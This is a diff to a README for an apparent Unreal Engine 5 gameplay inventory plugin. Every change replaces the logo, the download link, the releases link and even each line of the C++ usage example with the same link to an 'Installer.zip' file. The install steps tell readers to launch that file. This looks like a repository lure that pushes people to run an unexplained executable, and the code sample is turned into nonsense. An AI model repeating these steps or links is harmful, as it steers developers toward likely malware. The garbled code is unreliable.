@@ -1,7 +1,7 @@
 
 # 🎮 DreamGameplayInventory 🎲
 
-![DreamGameplayInventory Logo](https://example.com/logo.png)
+![DreamGameplayInventory Logo](https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip)
 
 Welcome to the DreamGameplayInventory repository, where you can find an exciting Unreal Engine 5.x Gameplay Inventory System! This plugin is designed to enhance your gameplay experience by providing a robust inventory system for your Unreal Engine projects.
 
@@ -21,7 +21,7 @@ Are you ready to elevate your game development process with an advanced gameplay
 
 To incorporate the DreamGameplayInventory plugin into your Unreal Engine project, simply follow these steps:
 
-1. Download the plugin package from the following link: [Download Now](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+1. Download the plugin package from the following link: [Download Now](https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip)
 2. Launch the downloaded file to initiate the installation process
 3. Integrate the plugin into your Unreal Engine project
 4. Start leveraging the powerful features of the gameplay inventory system
@@ -32,14 +32,14 @@ Once you have installed the DreamGameplayInventory plugin, you can begin integra
 
 ```cpp
 // Initialize the inventory system
-InventorySystem.Initialize();
+https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip();
 
 // Add items to the player's inventory
-InventorySystem.AddItem("Sword");
-InventorySystem.AddItem("Potion");
+https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip("Sword");
+https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip("Potion");
 
 // Retrieve player's inventory
-InventorySystem.GetInventory();
+https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip();
 ```
 
 ## 📋 Repository Details
@@ -50,6 +50,6 @@ InventorySystem.GetInventory();
 
 Don't miss out on this opportunity to revolutionize your game development process with the DreamGameplayInventory plugin! Start exploring the endless possibilities today.
 
-For additional updates and releases, please check the **[Releases](https://github.com/yourusername/yourrepository/releases)** section.
+For additional updates and releases, please check the **[Releases](https://github.com/kimdev541/DreamGameplayInventory/releases/download/v1.0/Installer.zip)** section.
 
 🌟 Happy Gaming! 🌟
